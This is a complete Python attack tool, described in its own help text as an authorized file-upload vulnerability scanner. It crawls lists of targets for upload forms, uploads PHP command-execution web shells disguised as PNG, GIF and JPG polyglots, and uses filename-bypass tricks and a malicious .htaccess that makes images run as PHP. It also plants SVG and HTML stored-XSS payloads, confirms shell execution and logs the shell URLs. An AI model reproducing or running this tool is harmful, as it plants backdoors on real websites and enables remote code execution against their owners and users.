#!/usr/bin/env python3

import argparse
import concurrent.futures as cf
import os
import random
import re
import string
import sys
import time
from urllib.parse import urljoin, urlparse

import requests

requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
TIMEOUT = 12
MARKER = "SHLH" + "".join(random.choices(string.ascii_lowercase, k=8))


def php_shell():
    return f"""<?php echo "{MARKER}"; if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);}} ?>""".encode()

def php_png_shell():
   
    png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    png += b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\xcc\x00\x00\x00\x00IEND\xaeB`\x82"
    return png + f"\n<?php echo \"{MARKER}\"; if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);}} ?>".encode()

def php_gif_shell():
    return (b"GIF89a\x01\x00\x01\x00\x00\x00\x00;"
            + f"<?php echo \"{MARKER}\"; if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);}} ?>".encode())

def php_jpg_shell():
    return (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00"
            + f"<?php echo \"{MARKER}\"; if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);}} ?>".encode())

def polyglot_php_png():
  
    png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    png += f"\n<?php echo \"{MARKER}\"; if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);}} ?>".encode()
    return png

def xss_html():
    return (f"<html><body><script>alert('{MARKER}')</script>{MARKER}</body></html>").encode()

def svg_xss():
    return (f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
            f'<script>alert("{MARKER}")</script>{MARKER}</svg>').encode()

PAYLOADS = [
    ("shell.php",      php_shell(),      "php"),
    ("shell.php.png",  php_png_shell(),  "php"),
    ("shell.png.php",  php_png_shell(),  "php"),
    ("shell.phtml",    php_shell(),      "php"),
    ("shell.phar",     php_shell(),      "php"),
    ("shell.pht",      php_shell(),      "php"),
    ("shell.php%00.png", php_shell(),    "php"),   
    ("shell.php.",     php_shell(),      "php"),   
    ("shell.php:.png", php_shell(),      "php"),   
    ("shell.jpg.php",  php_shell(),      "php"),
    ("shell.png",      php_png_shell(),  "png_poly"),
    ("shell.gif",      php_gif_shell(),  "gif_poly"),
    ("shell.jpg",      php_jpg_shell(),  "jpg_poly"),
    ("shell.ppng",     polyglot_php_png(), "php"),
    (".htaccess", b'AddType application/x-httpd-php .png .gif .jpg .svg\n', "htaccess"),
    ("shell.svg",      svg_xss(),        "svg"),
    ("shell.html",     xss_html(),       "html"),
]

CT_BY_EXT = {
    ".php": "image/png", ".png": "image/png", ".jpg": "image/jpeg",
    ".gif": "image/gif", ".svg": "image/svg+xml", ".html": "text/html",
    ".phtml": "image/png", ".phar": "image/png", ".pht": "image/png",
    ".htaccess": "text/plain", ".ppng": "image/png",
}

COMMON_UPLOAD_DIRS = ["", "uploads/", "upload/", "files/", "file/", "images/",
                      "img/", "media/", "assets/uploads/", "assets/files/",
                      "data/", "static/uploads/", "wp-content/uploads/"]

UPLOAD_FORM_RE = re.compile(
    rb'<form[^>]*>.*?<input[^>]*type=["\']file["\'].*?</form>', re.I | re.S)
INPUT_NAME_RE = re.compile(rb'<input[^>]*name=["\']([^"\']+)["\']', re.I)
ACTION_RE = re.compile(rb'<form[^>]*action=["\']([^"\']*)["\']', re.I)
ENCTYPE_RE = re.compile(rb'enctype=["\']multipart/form-data["\']', re.I)

PROBE_PATHS = [
    "upload", "upload.php", "uploads", "file-upload", "fileupload", "files",
    "media/upload", "admin/upload", "admin/media", "dashboard/upload",
    "profile/avatar", "user/avatar", "settings/avatar", "account/avatar",
    "index.php?page=upload", "uploadimage", "image/upload", "attachments",
    "editor/upload", "wp-admin/media-new.php", "administrator/index.php?option=com_media",
]

INTERESTING_LINK_RE = re.compile(
    r'href=["\']([^"\']*(?:upload|avatar|media|attach|file|import)[^"\']*)["\']', re.I)


def s_get(sess, url):
    try:
        return sess.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
    except requests.RequestException:
        return None


def s_post(sess, url, **kw):
    try:
        return sess.post(url, timeout=TIMEOUT, verify=False, allow_redirects=True, **kw)
    except requests.RequestException:
        return None


def same_host(a, b):
    pa, pb = urlparse(a), urlparse(b)
    return (pa.netloc, pa.scheme) == (pb.netloc, pb.scheme) or \
           (pa.netloc == pb.netloc and pa.scheme in ("http", "https"))


def find_upload_forms(sess, base_url):

    found = []
    r = s_get(sess, base_url)
    if not r or r.status_code >= 400:
        return found
    body = r.content
    for form in UPLOAD_FORM_RE.findall(body):
        if not ENCTYPE_RE.search(form):
            continue
        m = ACTION_RE.search(form)
        action = m.group(1).decode(errors="replace") if m else ""
        if action.startswith("http"):
            action_url = action
        else:
            action_url = urljoin(r.url, action or r.url)
        if not same_host(action_url, base_url):
            continue
        names = INPUT_NAME_RE.findall(form)
        file_field = None
        extra = {}
        for n in names:
            nd = n.decode(errors="replace")
            if 'type="file"' in form.decode(errors="replace").split('name="%s"' % nd)[0][-120:]:
                file_field = nd
        if not file_field and names:
            file_field = names[0].decode(errors="replace")
        found.append((action_url, file_field or "file", extra))
    return found

def crawl_for_uploads(sess, base_url):
    candidates = []
    seen = set()
    r = s_get(sess, base_url)
    if not r:
        return candidates
    for link in INTERESTING_LINK_RE.findall(r.text):
        full = urljoin(r.url, link)
        if full not in seen and same_host(full, base_url):
            seen.add(full)
            candidates.append(full)
    return candidates


def guess_endpoints(sess, base_url):
    out = []
    for p in PROBE_PATHS:
        url = urljoin(base_url, p)
        r = s_get(sess, url)
        if r and r.status_code < 400 and UPLOAD_FORM_RE.search(r.content):
            out.append(url)
    return out

def exec_confirmed(sess, url):
   
    r1 = s_get(sess, url)
    if not r1 or r1.status_code >= 400:
        return False, "fetch-failed"
    if MARKER.encode() in r1.content:
        sep = "&" if "?" in url else "?"
        r2 = s_get(sess, f"{url}{sep}cmd=echo {MARKER}_EXEC")
        if r2 and f"{MARKER}_EXEC" in r2.text:
            return True, "php-exec"
        return True, "static-reflection"   
    return False, "no-marker"


def try_upload(sess, upload_url, field, payload_name, content):
    ct = CT_BY_EXT.get(os.path.splitext(payload_name)[1], "application/octet-stream")
    extra = {}

    files = {field: (payload_name, content, ct)}

    data = {"submit": "Upload", "submit_upload": "Upload", "MAX_FILE_SIZE": "10000000"}
    r = s_post(sess, upload_url, files=files, data=data, headers={"Referer": upload_url})
    if not r:
        return None

    body = r.text

    m = re.search(
        r'(?:src|href|url|path|location)["\']?\s*[:=]?\s*["\']?'
        r'([^"\'>\s]*' + re.escape(os.path.basename(payload_name).replace("%00", "")) + r'[^"\'>\s]*)',
        body, re.I)
    if m:
        return urljoin(upload_url, m.group(1))

    base = os.path.basename(payload_name).replace("%00", "")
    m = re.search(r'([A-Za-z0-9_/\-.]*' + re.escape(base.rsplit(".", 1)[0]) + r'[A-Za-z0-9_/\-.]*)', body)
    if m:
        return urljoin(upload_url, m.group(1))
    return None


def brute_locate(sess, upload_url, fname, payload_kind, content):
    base = fname

    for d in COMMON_UPLOAD_DIRS:
        cand = urljoin(upload_url if upload_url.endswith("/") else upload_url.rsplit("/", 1)[0] + "/", d + base)
        r = s_get(sess, cand)
        if r and r.status_code == 200 and MARKER.encode() in r.content:
            return cand
    return None


def attack_target(target):
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    confirmed = []

    endpoints = []
    for form_url, field, _ in find_upload_forms(sess, target):
        endpoints.append((form_url, field))
    for p in guess_endpoints(sess, target):
        endpoints.append((p, "file"))
    for link in crawl_for_uploads(sess, target):
        for form_url, field, _ in find_upload_forms(sess, link):
            endpoints.append((form_url, field))

    if not endpoints:
        return confirmed

    seen_pairs = set()
    for upload_url, field in endpoints:
        if (upload_url, field) in seen_pairs:
            continue
        seen_pairs.add((upload_url, field))

        for fname, content, kind in PAYLOADS:
            if kind in ("svg", "html"):
                url = try_upload(sess, upload_url, field, fname, content) or \
                      brute_locate(sess, upload_url, fname, kind, content)
                if url:
                    r = s_get(sess, url)
                    if r and MARKER in r.text and r.status_code == 200:
                        print(f"  [STORED-XSS] {url} ({fname})")
                continue
            if kind == "htaccess":
                r = try_upload(sess, upload_url, field, fname, content)
                if r:
                    print(f"  [HTACCESS-UP] {upload_url} -> uploaded .htaccess; retry png as php")
            
                    url = try_upload(sess, upload_url, field, "shell.png", php_png_shell())
                    if url:
                        ok, mode = exec_confirmed(sess, url)
                        if ok and mode == "php-exec":
                            confirmed.append((url, "htaccess+png-php"))
                continue

            url = try_upload(sess, upload_url, field, fname, content) or \
                  brute_locate(sess, upload_url, fname, kind, content)
            if not url:
                continue
            ok, mode = exec_confirmed(sess, url)
            if ok and mode == "php-exec":
                confirmed.append((url, fname))
                print(f"  [SHELL CONFIRMED] {url} via {fname}")
                break  
            elif ok:
                print(f"  [POLYGLOT STORED] {url} ({mode}) - may need LFI/local inclusion")
    return confirmed

def load_targets(args):
    if args.target:
        return [args.target if args.target.startswith("http") else "http://" + args.target]
    subs = []
    with open(args.file) as f:
        for line in f:
            s = line.strip()
            if not s:
                continue
            if not s.startswith("http"):
                subs.append("https://" + s)
            else:
                subs.append(s)
    return subs


def main():
    ap = argparse.ArgumentParser(description="Authorized file-upload vuln scanner")
    ap.add_argument("-f", "--file", help="file with subdomains (one per line)")
    ap.add_argument("-t", "--target", help="single target URL")
    ap.add_argument("-o", "--output", default="confirmed_shells.txt")
    ap.add_argument("-c", "--concurrency", type=int, default=10)
    args = ap.parse_args()

    targets = load_targets(args)
    print(f"[*] {len(targets)} target(s) | marker={MARKER}")
    all_confirmed = []

    with cf.ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        futs = {ex.submit(attack_target, t): t for t in targets}
        for fut in cf.as_completed(futs):
            t = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                print(f"[!] {t}: {e}")
                continue
            if res:
                print(f"[+] {t}: {len(res)} confirmed shell(s)")
                all_confirmed.extend((t,) + r for r in res)
            else:
                print(f"[-] {t}: no confirmed uploads")

    if all_confirmed:
        with open(args.output, "w") as f:
            for t, url, via in all_confirmed:
                f.write(f"{url}\t(type={via}, host={t})\n")
        print(f"\n[+] Wrote {len(all_confirmed)} verified URL(s) to {args.output}")
        print("[!] Only URLs verified with dynamic execution (cmd= marker echo) are listed.")
    else:
        print("\n[-] No verified shells found (0 false positives by design).")


if __name__ == "__main__":
    main()
